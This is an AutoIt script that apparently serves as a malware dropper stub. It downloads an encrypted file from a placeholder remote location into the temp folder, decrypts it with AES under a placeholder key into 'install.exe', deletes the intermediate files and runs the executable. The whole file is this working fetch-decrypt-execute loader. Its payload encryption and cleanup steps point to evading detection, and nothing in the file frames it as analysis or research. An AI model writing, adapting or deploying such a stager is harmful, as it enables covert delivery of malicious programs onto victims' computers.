#Include "lib/aes.au3"

$serverFile = "RemoteFileLocation"
$tmpEncFile = @TempDir & "\101_80085.enc"
$exeFile = @TempDir & "\install.exe"

Local $sData = InetRead($serverFile)
Local $newfile = FileOpen($tmpEncFile,2)
$r = FileWrite($newfile, $sData)

While Not FileExists($tmpEncFile)
	Sleep(1)
WEnd

If FileExists($exeFile) Then
	FileDelete($exeFile)
EndIf

$r =FileCopy($tmpEncFile, @TempDir & "\.00000000")

_AesDecryptFile("AESKey", @TempDir & "\.00000000", $exeFile, "CFB")

While Not FileExists($exeFile)
	Sleep(1)
WEnd

FileDelete($tmpEncFile)
FileDelete(@TempDir & "\.00000000")
Run($exeFile)

Exit




